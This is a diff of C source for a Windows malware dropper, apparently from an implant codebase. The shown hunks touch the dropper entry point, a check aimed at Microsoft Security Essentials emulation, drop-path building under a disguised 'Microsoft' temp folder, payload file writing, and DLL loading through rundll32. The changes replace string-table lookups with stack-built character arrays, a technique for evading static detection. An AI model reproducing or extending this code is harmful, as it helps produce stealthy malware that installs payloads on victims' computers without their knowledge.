@@ -57,7 +57,7 @@ int __stdcall DropperEntryPoint(DropperHeader *header)
 	// End of MS sec essential emulation check 
 
 	// Get user temporary directory
-	char * lpTmpEnvVar = STRING(STRIDX_TMP_ENVVAR);
+	char lpTmpEnvVar[] = { '%', 'T', 'M', 'P', '%', 0x0 };
 	char * lpTmpDir = (char*) VirtualAlloc(NULL, MAX_PATH, MEM_COMMIT, PAGE_READWRITE);
 	if ( NULL == lpTmpDir )
 		goto OEP_CALL;
@@ -65,7 +65,7 @@ int __stdcall DropperEntryPoint(DropperHeader *header)
 	memset(lpTmpDir, 0x0, MAX_PATH);
 	DWORD dwRet = GetEnvironmentVariable(lpTmpEnvVar, lpTmpDir, MAX_PATH);
 	if (dwRet == 0) {
-		char * lpTempEnvVar = STRING(STRIDX_TEMP_ENVVAR);
+		char lpTempEnvVar[] = { 'T', 'E', 'M', 'P', 0x0 };
 		dwRet = GetEnvironmentVariable(lpTempEnvVar, lpTmpDir, MAX_PATH);
 		if (dwRet == 0) {
 			// we are unable to get the user TMP or TEMP directory,
@@ -86,6 +86,7 @@ int __stdcall DropperEntryPoint(DropperHeader *header)
 		goto OEP_CALL;
 	
 
+	char lpDirSep[] = { '\\', 0x0 };
 	char lpSubDir[] = { 'M', 'i', 'c', 'r', 'o', 's', 'o', 'f', 't', 0x0 };
 	strcat(lpTmpDir, STRING(STRIDX_DIRSEP));
 	strcat(lpTmpDir, lpSubDir);
@@ -170,8 +171,7 @@ OEP_CALL:
 
 
 BOOL WINAPI DumpFile(CHAR * fileName, CHAR* fileData, DWORD fileSize, DWORD originalSize, DropperHeader *header)
-{
-	
+{	
 	DWORD * stringsOffsets = (DWORD *) (((char*)header) + header->stringsOffsets.offset);
 	char * strings = (char *) (((char*)header) + header->strings.offset);
 	DWORD* dll_calls = (DWORD*) (((char*)header) + header->callAddresses.offset);
@@ -232,7 +232,6 @@ DWORD WINAPI CoreThreadProc(__in  LPVOID lpParameter)
 	memcpy(complete_path, STRING(STRIDX_RUNDLL), strlen(STRING(STRIDX_RUNDLL)));
 	strcat( complete_path, header->dllPath);
 	strcat( complete_path, STRING(STRIDX_COMMAHFF8));
-		
 
 	HMODULE hLib = LoadLibrary(header->dllPath);
 	if (hLib == INVALID_HANDLE_VALUE)
@@ -259,3 +258,5 @@ THREAD_EXIT:
 
 	return 0;
 }
+
+
